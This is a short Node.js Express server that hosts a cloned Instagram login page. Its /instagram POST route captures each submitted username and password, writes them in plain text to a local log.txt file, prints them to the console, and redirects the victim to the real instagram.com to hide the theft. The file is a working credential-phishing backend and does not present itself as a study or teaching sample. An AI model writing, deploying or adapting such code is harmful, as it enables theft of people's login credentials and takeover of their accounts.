const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const port = 5000;

app.use('/Instagram_files', express.static(path.join(__dirname, '../Instagram_files')));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: false}))

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'))
});

app.post('/instagram', (req, res) => {
    const { username, password } = req.body;
    const file = path.join(__dirname, '../log.txt');
    fs.writeFile(file, `username: ${username}\npassword: ${password}`, (error) => {
        if (error) {
            console.error(error);
            res.status(500).send("Internal Server Error");
        } else {
            res.redirect('https://www.instagram.com/')
            console.log("username: " + username);
            console.log("password: " + password); 
            
        }
    });
});
app.listen(port, () => {
    console.log("server start on port " + port);
});
